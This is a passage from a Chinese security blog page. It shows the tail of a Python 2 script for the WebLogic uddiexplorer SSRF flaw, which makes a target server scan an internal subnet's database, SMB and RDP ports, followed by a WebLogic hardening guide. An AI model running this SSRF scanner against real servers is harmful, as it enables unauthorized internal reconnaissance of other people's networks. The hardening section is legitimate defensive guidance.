class="string">'&#123;ip&#125;.&#123;i&#125;'</span>.format(ip=ip, i=i)</span><br><span class="line">        <span class="keyword">print</span> final_ip</span><br><span class="line">        thread.start_new_thread(scan, (final_ip,))</span><br><span class="line">        time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(final_ip)</span>:</span></span><br><span class="line">    ports = (<span class="string">'6379'</span>,<span class="string">'445'</span>,<span class="string">'8080'</span>,<span class="string">'3389'</span>,<span class="string">'1433'</span>,<span class="string">'1521'</span>,<span class="string">'3306'</span>,<span class="string">'80'</span>,<span class="string">'443'</span>,<span class="string">'7001'</span>,<span class="string">'8000'</span>)</span><br><span class="line">    <span class="keyword">for</span> port <span class="keyword">in</span> ports:</span><br><span class="line">        vul_url = args.url+<span class="string">'/uddiexplorer/SearchPublicRegistries.jsp?operator=http://%s:%s&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search'</span> % (final_ip,port)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment">#print vul_url</span></span><br><span class="line">            r = requests.get(vul_url, timeout=<span class="number">15</span>, verify=<span class="keyword">False</span>)</span><br><span class="line">            result1 = re.findall(<span class="string">'weblogic.uddi.client.structures.exception.XML_SoapException'</span>,r.content)</span><br><span class="line">            result2 = re.findall(<span class="string">'but could not connect'</span>, r.content)</span><br><span class="line">            result3 = re.findall(<span class="string">'No route to host'</span>, r.content)</span><br><span class="line">            <span class="keyword">if</span> len(result1) != <span class="number">0</span> <span class="keyword">and</span> len(result2) == <span class="number">0</span> <span class="keyword">and</span> len(result3) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'[!]'</span>+final_ip + <span class="string">':'</span> + port</span><br><span class="line">        <span class="keyword">except</span> Exception, e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">'Weblogic SSRF vulnerable exploit'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'--url'</span>, dest=<span class="string">'url'</span>, required=<span class="keyword">True</span>, help=<span class="string">'Target url'</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    ip = <span class="string">"192.168.4"</span></span><br><span class="line">    <span class="keyword">if</span> ip:</span><br><span class="line">        <span class="keyword">print</span> ip</span><br><span class="line">        ite_ip(ip)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"no ip"</span></span><br></pre></td></tr></table></figure>
<h2 id="0x02-安全加固"><a href="#0x02-安全加固" class="headerlink" title="0x02 安全加固"></a>0x02 安全加固</h2><p>1.1. 目的</p>
<p>   本规范明确了Weblogic应用服务器安全配置方面的基本要求。为了提高Weblogic应用服务器的安全性而提出的。<br>1.2. 范围<br>   本规范适用于XXXX使用的Weblogic应用服务器。<br>\2. 强化Weblogic主机<br>2.1. 强化操作系统网络服务<br>【说明】在安装Weblogic前加固底层的操作系统。<br>2.2. 使用可以防止非授权访问的文件系统<br>【说明】确保Weblogic主机的文件系统可以防止非授权访问，例如Windows的NTFS。<br>2.3. 限制Weblogic主机上的用户数量<br>【说明】理想状况下，主机上的帐号应为2个管理员权限的帐号，1个运行Weblogic的帐号。<br>2.4. 帐号和密码<br>【说明】避免使用明显可以猜测到的帐号如”system”,”admin”或者”administrator”。口令至少8位，并满足复杂度要求。<br>2.5. 访问Weblogic资源的帐号的唯一性<br>【说明】在操作系统上建立一个专门用于Weblogic的帐号。<br>【具体配置】<br>该帐号只能操作以下三个目录：<br>1)BEA主目录。该目录是BEA多个产品的共享目录。<br>2)Weblogic安装目录。该目录包括了所有的安装程序。<br>3)域目录。该目录包括了设置文件、安全文件、日志文件和J2EE应用等。<br>赋予该帐号对以上三个目录读写执行权限。<br>2.6. 使用特殊帐号Run Weblogic Server Windows服务<br>【说明】在Windows平台，可以以Windows服务的方式运行Weblogic Server实例。这样会导致每次启动Windows自动执行Weblogic Server。而且不要以Windows administrator权限运行Weblogic Server。<br>【具体配置】<br>如何以一个特殊非管理员帐号运行Weblogic Server请参考以下：  </p>
<p> <a href="http://e-docs.bea.com/wls/docs70/adminguide/startstop.html#Setting_Up_a_Weblogic_Server_as_a_Windows_Service" target="_blank" rel="noopener">http://e-docs.bea.com/wls/docs70/adminguide/startstop.html#Setting_Up_a_Weblogic_Server_as_a_Windows_Service</a></p>
<p>验证以一个特殊非管理员帐号运行Weblogic Server请参考以下：</p>
<p> <a href="http://e-docs.bea.com/wls/docs70/adminguide/startstop.html#VerifyUserAccountForWinService" target="_blank" rel="noopener">http://e-docs.bea.com/wls/docs70/adminguide/startstop.html#VerifyUserAccountForWinService</a><br>2.7. 不在生产机上开发<br>【说明】在开发环境中开发相应的代码，经过测试后将代码转移到生产机上。此举是为了防止开发过程中的Bug影响生产环境。<br>【具体配置】  验证DocumentRoot包括以下设置：  </p>
<p>Order allow,deny Allow from all<br>Options None<br>AllowOverride None<br>​<br>2.8. 不在生产机上安装开发和sample软件<br>【说明】将开发工具从生产机上移除可以防止该工具被入侵者利用，一定程度地访问生产系统。<br>2.9. 启动安全审计<br>【说明】如果Weblogic运行的操作系统支持对文件和目录访问的安全审计，建议使用日志跟踪对文件和目录的拒绝访问。<br>【具体配置】<br>使用ModSecurity Core Rules限制请求的方式： </p>
<p>modsecurity_crs_30_http_policy.conf 文件包括以下的规则，</p>
<p># allow request methods</p>
<p>#</p>
<p># TODO Most applications only use GET, HEAD, and POST request</p>
<p># methods, if so uncomment the line below. Otherwise you are advised </p>
<p># to edit the line before uncommenting it.</p>
<p>#  </p>
<p>SecRule REQUEST_METHOD “!^((?:(?:POS|GE)T|OPTIONS|HEAD))$” \<br>“phase:1,log,auditlog,status:501,msg:’Method is not allowed by policy’, severity:’2’,,id:’960032’,”<br>2.10. 应用最新的BEA补丁，考虑实施官方最新的安全建议<br>【说明】如题<br>【具体配置】<br>注册BEA Advisories &amp; Notifications（<a href="http://dev2dev.bea.com/advisories" target="_blank" rel="noopener">http://dev2dev.bea.com/advisories</a>）以便收到最新的安全建议信息。  </p>
<p>从<a href="http://commerce.beasys.com/downloads" target="_blank" rel="noopener">http://commerce.beasys.com/downloads</a>.可以下载Service Pack<br>\3. 强化网络连接<br>3.1. 使用防火墙或Weblogic Server connection filters<br>【说明】建议使用防火墙限制Weblogic Server域外到域的连接；使用Connection Filters限制Weblogic Server域内的连接。更多信息可参考<br><a href="http://e-docs.bea.com/wls/docs70/secmanage/domain.html#connection_filter" target="_blank" rel="noopener">http://e-docs.bea.com/wls/docs70/secmanage/domain.html#connection_filter</a><br>3.2. 使用管理端口来承载管理的流量 </p>
<p>【说明】建议使用域范围内的管理端口 Administration Port来限制同一Weblogic Server域内的server instances间的流量都经过同一端口。当不使用管理端口时，管理流量会以明文形式在网上传输。管理端口另一个好处是当遭受到拒绝服务攻击时，仍然可以通过该端口管理Weblogic Server。</p>
<p>配合Connection Filters使用，可以指定Weblogic Server只接受来自某一IP段的管理请求，并所有连接只通过一个端口。</p>
<p>使用管理端口可以保证客户端与管理控制台以加密的方式连接。 更多信息可以参考<br><a href="http://e-docs.bea.com/wls/docs70/ConsoleHelp/domain.html#enabling" target="_blank" rel="noopener">http://e-docs.bea.com/wls/docs70/ConsoleHelp/domain.html#enabling</a><br>3.3. 使用管理通道 </p>
<p>【说明】建议启用管理通道Administration Channel以确保服务器间的管理流量的安全性。没有管理通道，一些关键的管理信息会以明文传输。更多的信息可以参考<br><a href="http://e-docs.bea.com/wls/docs70/admin_domain/network.html" target="_blank" rel="noopener">http://e-docs.bea.com/wls/docs70/admin_domain/network.html</a></p>
<p>\4. 强化Weblogic安全服务<br>4.1. 部署符合生产环境的Security Provider<br>【说明】Weblogic Security Service使用了一个可插拔的安全架构，在这个架构下可以部署多个secuirty provider。缺省条件下，Weblogic Server包括其自身的security providers,该provider已经提供了完整的安全解决方案。<br>【具体配置】<br>确保恰当地部署了security providers.<br>可以通过以下位置验证：</p>
<p>Administration Console under the Security → Realms → RealmName→<br>Providers folder. </p>
<p>其它信息可以参考：<a href="http://e-docs.bea.com/wls/docs70/secmanage/realm.html" target="_blank" rel="noopener">http://e-docs.bea.com/wls/docs70/secmanage/realm.html</a><br>4.2. 使用SSL<br>【说明】为保证数据传输安全，建议使用SSL和HTTPS替代HTTP。Weblogic Server包括一系列的开发用的Private Keys，数字证书和truseted certificate authorities。每一个下载Weblogic Server的用户都拥有对这些证书的Private Keys。禁止使用展示用的identity &amp; trust.<br>设置SSL可以参考<a href="http://e-docs.bea.com/wls/docs70/secmanage/ssl.html" target="_blank" rel="noopener">http://e-docs.bea.com/wls/docs70/secmanage/ssl.html</a><br>4.3. 使用主机名验证<br>【说明】使用主机名验证以避免中间人攻击。缺省下，Weblogic SSL验证发起连接的主机是否经过授权，但实施SSL前主机名验证可能已经被禁止了。 </p>
<p>【具体配置】<br>确保使用了Hostname 可以通过以下位置设置：<br> Administration Console on theServer s→ ServerName → Connections → SSL<br>tab.<br>4.4. 防止拒绝服务<br>【说明】限制请求的大小和时间以防止拒绝服务攻击。Weblogic Server可以限制消息的大小和消息到达的最大时间。<br> 可以通过以下位置设置：Administration Console on the Servers →<br>ServerName →Connections → Protocols tab.<br>4.5. 设置帐号锁定和登录时间<br>【说明】限制请求的大小和时间以防止拒绝服务攻击。Weblogic Server可以限制消息的大小和消息到达的最大时间。<br> 可以通过以下位置设置：Administration Console on the Security → Realms<br>→ RealmName → User Lockouts tab.<br>4.6. 开启安全审计<br>【说明】如果开启了Weblogic Security Service提供的Auditing Provider，日志会存在以下位置：DomainName\DefaultAuditRecorder.log<br> 可以通过以下位置设置：Administration Console on the Security → Realms<br>→ RealmName → Providers → Auditors page. 更多信息可以参考：<br><a href="http://e-docs.bea.com/wls/docs70/ConsoleHelp/security_7x.html#auditprovider" target="_blank" rel="noopener">http://e-docs.bea.com/wls/docs70/ConsoleHelp/security_7x.html#auditprovider</a><br>4.7. 限制发送主机名和版本号<br>【说明】缺省条件下，当Weblogic Server响应HTTP请求时，在其HTTP响应的包头中包括服务器的名称和Weblogic版本号，这会导致服务器信息的泄漏。 </p>
<p>可以通过以下位置设置： </p>
<p> disable the Send Server Header Enabled attribute in the Administration Console. The attribute is located on the Server →ServerName → Connections → HTTP tab.<br>4.8. 默认安全角色<br>【说明】确保正确地将用户和组分配给默认的Weblogic Server Security roles. 缺省下，Weblogic是基于一系列的缺省安全角色和安全策略来保护资源。更多信息可以参考：</p>
<p><a href="http://e-docs.bea.com/wls/docs70/adminguide/secsysadm.html" target="_blank" rel="noopener">http://e-docs.bea.com/wls/docs70/adminguide/secsysadm.html</a></p>

      
    </div>
    <footer class="article-footer">
      
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/中间件安全/">中间件安全</a></li></ul>

    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/">下一页 &raquo;</a>
  </nav>

</section>
        
      </div>
      
        <div align="center" style="margin-top: 30px;"><hr class="hr" style="margin:0px; height:3px;"></div>
      
      <footer id="footer">
  

  <div class="container">
      	<div class="row">
	      <p> Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/iTimeTraveler/hexo-theme-hiker" target="_blank">Hexo-theme-hiker</a> </p>
	      <p id="copyRightEn">Copyright &copy; 2016 - 2018 shackle All Rights Reserved.</p>
	      
	      
    		<p class="busuanzi_uv">
				访客数 : <span id="busuanzi_value_site_uv"></span> |  
				访问量 : <span id="busuanzi_value_site_pv"></span>
		    </p>
  		   
		</div>

		
  </div>
</footer>


<!-- min height -->

<script>
    var wrapdiv = document.getElementById("wrap");
    var contentdiv = document.getElementById("content");
    var allheader = document.getElementById("allheader");

    wrapdiv.style.minHeight = document.body.offsetHeight + "px";
    if (allheader != null) {
      contentdiv.style.minHeight = document.body.offsetHeight - allheader.offsetHeight - document.getElementById("footer").offsetHeight + "px";
    } else {
      contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("footer").offsetHeight + "px";
    }
</script>
    </div>
    <!-- <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
    <a href="/about" class="mobile-nav-link">About</a>
  
</nav> -->
    

<!-- mathjax config similar to math.stackexchange -->

<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/scripts.js"></script>


  <script src="/js/home.js"></script>










	<div style="display: none;">
    <script src="https://s95.cnzz.com/z_stat.php?id=1261091520&web_id=1261091520" language="JavaScript"></script>
  </div>



	<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
	</script>






  </div>

  <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="display: none;">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <h2 class="modal-title" id="myModalLabel">设置</h2>
      </div>
      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">


      <div class="modal-body">
          <div style="margin:6px;">
            <a data-toggle="collapse" data-parent="#accordion" href="#collapseOne" onclick="javascript:setFontSize();" aria-expanded="true" aria-controls="collapseOne">
              正文字号大小
            </a>
          </div>
          <div id="collapseOne" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingOne">
          <div class="panel-body">
            您已调整页面字体大小
          </div>
        </div>
      


          <div style="margin:6px;">
            <a data-toggle="collapse" data-parent="#accordion" href="#collapseTwo" onclick="javascript:setBackground();" aria-expanded="true" aria-controls="collapseTwo">
              夜间护眼模式
            </a>
        </div>
          <div id="collapseTwo" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingTwo">
          <div class="panel-body">
            夜间模式已经开启，再次单击按钮即可关闭 
          </div>
        </div>

        <div>
            <a data-toggle="collapse" data-parent="#accordion" href="#collapseThree" aria-expanded="true" aria-controls="collapseThree">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关 于&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
        </div>
         <div id="collapseThree" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingThree">
          <div class="panel-body">
            shackle
          </div>
          <div class="panel-body">
            Copyright © 2018 shackle All Rights Reserved.
          </div>
        </div>
      </div>


      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
      <div class="modal-footer">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
      </div>
    </div>
  </div>
</div>
  
  <a id="rocket" href="#top" class=""></a>
  <script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
  
</body>
</html>